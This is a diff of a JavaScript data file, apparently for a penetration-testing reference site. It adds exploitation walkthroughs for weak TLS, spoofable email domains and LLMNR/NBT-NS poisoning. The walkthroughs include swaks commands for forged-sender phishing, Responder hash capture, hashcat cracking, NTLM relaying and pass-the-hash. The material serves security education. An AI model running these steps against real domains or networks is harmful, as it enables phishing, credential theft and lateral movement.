-              ["Cookie attributes", "Verify Secure, HttpOnly, and SameSite on session cookies"],
-              ["Automated", "Nuclei and dedicated header scanners grade the set"]
+              ["1", "Inspect response headers", "Missing defences identified"],
+              ["2", "Find a paired bug (XSS/framing/MitM)", "Amplification opportunity"],
+              ["3", "Exploit without the browser control", "Fuller impact than otherwise"],
+              ["4", "Abuse weak cookie flags", "Session theft / CSRF"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["curl / browser dev-tools", "Inspect headers and cookie attributes"],
+              ["Nuclei", "Grade the security-header set automatically"],
+              ["Mozilla Observatory / securityheaders", "Scored external header assessment"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "OWASP — Secure Headers Project", url: "https://owasp.org/www-project-secure-headers/" },
+              { label: "MDN — HTTP security headers", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers" }
             ]
           },
           {
@@ -4216,7 +4450,7 @@ var VULNS = [
         severity: "Medium",
         ref: "https://ssl-config.mozilla.org/",
         description: "Outdated protocols, weak ciphers, or bad certificates undermine transport security and enable interception.",
-        brief: "TLS protects data in transit, but only if it is configured well. Support for obsolete protocols (SSLv3, TLS 1.0/1.1), weak cipher suites, small keys, or broken certificate validation opens the door to downgrade attacks, interception, and, in historical cases, named exploits (POODLE, BEAST, Heartbleed). Certificate problems — expired, self-signed on production, weak signatures, or mismatched names — erode trust and can enable man-in-the-middle.\n\nThe fix is a modern, minimal protocol and cipher configuration plus proper certificate management.",
+        brief: "TLS protects data in transit, but only if it is configured well. Support for obsolete protocols (SSLv3, TLS 1.0/1.1), weak cipher suites, small keys, or broken certificate validation opens the door to downgrade and interception — and, historically, named exploits (POODLE, BEAST, Heartbleed).\n\nImpact: interception or tampering of traffic and erosion of trust; certificate problems can enable man-in-the-middle. The fix is a modern, minimal protocol/cipher configuration plus proper certificate management.",
         quickReference: [
           { label: "Scan the config", cmd: "testssl.sh https://target.com   or   sslscan target.com:443" },
           { label: "nmap ciphers", cmd: "nmap --script ssl-enum-ciphers -p443 target.com" },
@@ -4224,6 +4458,17 @@ var VULNS = [
           { label: "Reference config", cmd: "Mozilla SSL Configuration Generator (Intermediate/Modern)" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Enumerate protocols and ciphers", cmd: "testssl.sh https://target             # full protocol/cipher/vuln report\nsslscan target:443\nnmap --script ssl-enum-ciphers -p443 target   # grades each suite" },
+              { label: "2. Flag the weaknesses", cmd: "# red flags in the output:\nSSLv3 / TLSv1.0 / TLSv1.1 offered\nRC4 / 3DES / EXPORT / NULL ciphers\nRSA key < 2048, SHA-1 signature, no forward secrecy" },
+              { label: "3. Inspect the certificate", cmd: "echo | openssl s_client -connect target:443 -servername target 2>/dev/null | openssl x509 -noout -dates -issuer -subject\n# expired? self-signed on prod? hostname mismatch? weak sig?" },
+              { label: "4. Assess the practical attack", cmd: "# no HSTS + TLS1.0 -> SSL-strip/downgrade by an on-path attacker\n# known-vuln checks: testssl.sh reports Heartbleed/POODLE/ROBOT if present" },
+              { label: "5. Demonstrate impact (in scope)", cmd: "# on a controlled network path, show downgrade/interception of a test session\n# report the exact weak protocols/ciphers and cert problems found" }
+            ]
+          },
           {
             title: "Weaknesses to Check",
             type: "table",
@@ -4237,14 +4482,33 @@ var VULNS = [
             ]
           },
           {
-            title: "Detection",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Tool", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["testssl.sh", "Comprehensive protocol, cipher, and vulnerability check"],
-              ["sslscan / sslyze", "Fast enumeration of supported protocols and ciphers"],
-              ["nmap ssl-enum-ciphers", "Grades cipher suites per protocol"],
-              ["Browser / cert inspection", "Validity, chain, hostname, and signature algorithm"]
+              ["1", "Scan protocols/ciphers/cert", "Weak configuration mapped"],
+              ["2", "Identify downgrade/known-vuln exposure", "Concrete weakness"],
+              ["3", "On-path downgrade / strip (in scope)", "Interceptable traffic"],
+              ["4", "Capture or tamper data in transit", "Confidentiality/integrity loss"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["testssl.sh", "Comprehensive TLS protocol/cipher/vuln assessment"],
+              ["sslscan / sslyze", "Fast protocol and cipher enumeration"],
+              ["nmap ssl-enum-ciphers", "Per-protocol cipher grading"],
+              ["openssl s_client", "Manual certificate and handshake inspection"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "Mozilla — SSL Configuration Generator", url: "https://ssl-config.mozilla.org/" },
+              { label: "OWASP — Transport Layer Security Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html" }
             ]
           },
           {
@@ -4266,7 +4530,7 @@ var VULNS = [
         severity: "Medium",
         ref: "https://dmarc.org/",
         description: "Weak or missing email-authentication records let attackers send mail that appears to come from the domain.",
-        brief: "SPF, DKIM, and DMARC are the DNS records that let receiving servers verify that mail claiming to be from a domain is authorised. When they are missing, misconfigured, or set to monitor-only (DMARC p=none), an attacker can spoof the domain — sending phishing that passes as legitimate internal or brand email.\n\nIt is a common finding in OSINT and a direct enabler of phishing. The records are public, so the weakness is trivially assessed from the outside.",
+        brief: "SPF, DKIM, and DMARC are the DNS records that let receiving servers verify that mail claiming to be from a domain is authorised. When they are missing, misconfigured, or set to monitor-only (DMARC p=none), an attacker can spoof the domain — sending phishing that passes as legitimate internal or brand email.\n\nImpact: credible phishing and business-email-compromise under the organisation's own domain. The records are public, so the weakness is trivially assessed from the outside.",
         quickReference: [
           { label: "Check the records", cmd: "dig +short TXT target.com | grep spf1\ndig +short TXT _dmarc.target.com" },
           { label: "Weak DMARC", cmd: "v=DMARC1; p=none   -> monitor only, effectively spoofable" },
@@ -4274,6 +4538,17 @@ var VULNS = [
           { label: "Assess", cmd: "Online DMARC/SPF checkers; MXToolbox; or manual dig" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Read the public records", cmd: "dig +short TXT target.com | grep spf1        # SPF: -all vs ~all/+all vs none\ndig +short TXT _dmarc.target.com             # DMARC policy\ndig +short TXT selector._domainkey.target.com  # DKIM (guess/known selectors)" },
+              { label: "2. Judge whether the domain is spoofable", cmd: "# spoofable if any of:\n#   no SPF record, or SPF ends ~all / +all\n#   no DMARC, or DMARC p=none\n#   no DKIM signing / no subdomain policy (sp=)\nspoofcheck.py target.com     # summarises the verdict" },
+              { label: "3. Craft a spoofed message", cmd: "# with p=none, mail with a forged From: passes DMARC 'none' handling:\nswaks --to victim@corp --from ceo@target.com \\\n      --header 'Subject: Invoice' --server <open-relay-or-sender> --body phish.txt" },
+              { label: "4. Improve deliverability", cmd: "# align envelope/visible domains, warm sender infra, match branding\n# subdomain spoofing where sp= is unset: from finance.target.com" },
+              { label: "5. Confirm receipt", cmd: "# send to a controlled mailbox first; check it lands in inbox (not spam)\n# and that DMARC shows pass/none in the headers before the real campaign" }
+            ]
+          },
           {
             title: "The Three Records",
             type: "table",
@@ -4286,15 +4561,32 @@ var VULNS = [
             ]
           },
           {
-            title: "Weaknesses",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Condition", "Effect"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["No SPF/DKIM/DMARC", "Domain is freely spoofable"],
-              ["DMARC p=none", "Receivers take no action on failures — spoofing lands"],
-              ["SPF ~all or +all", "Softfail/pass weakens or negates enforcement"],
-              ["No DKIM", "Loses the cryptographic proof and a DMARC alignment path"],
-              ["Missing subdomain policy", "sp= not set — subdomains remain spoofable"]
+              ["1", "Query SPF/DKIM/DMARC records", "Authentication posture"],
+              ["2", "Confirm weak/missing policy", "Domain is spoofable"],
+              ["3", "Send spoofed mail from the domain", "Passes as legitimate"],
+              ["4", "Phish employees/customers", "Credential theft / BEC"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["dig / MXToolbox", "Read SPF/DKIM/DMARC DNS records"],
+              ["spoofcheck / spoofy", "Automated spoofability verdict"],
+              ["swaks", "Craft and send test spoofed messages"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "DMARC.org — Overview", url: "https://dmarc.org/" },
+              { label: "M3AAWG — Email Authentication best practices", url: "https://www.m3aawg.org/" }
             ]
           },
           {
@@ -4317,7 +4609,7 @@ var VULNS = [
         ref: "https://attack.mitre.org/techniques/T1557/001/",
         theory: "theory/2026-08-18-coercion-ntlm-relay.html",
         description: "Legacy multicast name-resolution fallbacks let an attacker on the LAN capture NetNTLM hashes to crack or relay.",
-        brief: "When Windows fails to resolve a name over DNS, it falls back to broadcasting the query to the local segment over LLMNR, NBT-NS, or mDNS. An attacker on the same segment answers 'that's me', and the victim authenticates to them — handing over a NetNTLM hash to crack offline or relay onward.\n\nThese fallbacks are rarely needed and enabled by default, which makes poisoning one of the most reliable opening moves on an internal network. See the Coercion & NTLM Relay theory page.",
+        brief: "When Windows fails to resolve a name over DNS, it falls back to broadcasting the query to the local segment over LLMNR, NBT-NS, or mDNS. An attacker on the same segment answers 'that's me', and the victim authenticates to them — handing over a NetNTLM hash to crack offline or relay onward.\n\nImpact: credential capture and, via relay, lateral movement — one of the most reliable opening moves on an internal network because the fallbacks are rarely needed yet enabled by default. See the Coercion & NTLM Relay theory page.",
         quickReference: [
           { label: "Listen (recon)", cmd: "responder -I eth0 -A   (analyze only, no poisoning)" },
           { label: "Capture hashes", cmd: "responder -I eth0 -wd" },
@@ -4325,6 +4617,17 @@ var VULNS = [
           { label: "Relay instead", cmd: "Disable Responder SMB/HTTP, then ntlmrelayx.py to unsigned targets" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Observe the traffic first (analyze mode)", cmd: "responder -I eth0 -A\n# passively see which hosts broadcast LLMNR/NBT-NS queries -> poisoning will work\n# (no answers sent yet -> non-disruptive recon)" },
+              { label: "2. Poison and capture NetNTLMv2", cmd: "responder -I eth0 -wd\n# answers name queries; victims that mistype/hit a stale name authenticate to you\n# hashes are written to Responder's logs (and printed live)" },
+              { label: "3. Crack the captured hashes offline", cmd: "hashcat -m 5600 hashes.txt rockyou.txt -r best64.rule\n# NetNTLMv2 -> weak passwords fall quickly -> valid domain credential" },
+              { label: "4. Or relay instead of cracking", cmd: "# in Responder.conf set SMB = Off and HTTP = Off, then:\nntlmrelayx.py -tf unsigned_targets.txt -smb2support -i\n# the poisoned auth is relayed to a host that doesn't require SMB signing" },
+              { label: "5. Use the credential / relayed access", cmd: "netexec smb <targets> -u user -H <nt-hash>       # PtH with a cracked/relayed cred\n# or --dump-sam / -c on the relayed session for lateral movement" }
+            ]
+          },
           {
             title: "The Fallback Protocols",
             type: "table",
@@ -4337,14 +4640,33 @@ var VULNS = [
             ]
           },
           {
-            title: "Impact",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Credential capture", "NetNTLMv2 hashes to crack offline (weak passwords fall fast)"],
-              ["Relay to access", "Forward the auth to unsigned SMB/LDAP hosts for lateral movement"],
-              ["Common foothold", "Frequently the first credential on an internal engagement"],
-              ["Scale", "Mistyped/stale names generate a steady stream of victims"]
+              ["1", "Analyze LLMNR/NBT-NS broadcasts", "Confirm poisoning viability"],
+              ["2", "Poison and capture", "NetNTLMv2 hashes"],
+              ["3", "Crack offline OR relay", "Cleartext cred or live session"],
+              ["4", "Authenticate / move laterally", "Internal foothold"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Responder", "Poison LLMNR/NBT-NS/mDNS and capture NetNTLM hashes"],
+              ["hashcat", "Crack NetNTLMv2 (mode 5600)"],
+              ["Impacket ntlmrelayx", "Relay the captured authentication instead of cracking"],
+              ["NetExec", "Use cracked/relayed creds for lateral movement"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "MITRE ATT&CK — LLMNR/NBT-NS Poisoning and Relay (T1557.001)", url: "https://attack.mitre.org/techniques/T1557/001/" },
+              { label: "The Hacker Recipes — LLMNR/NBT-NS/mDNS spoofing", url: "https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/llmnr-nbtns-mdns-spoofing" }
             ]
           },
           {
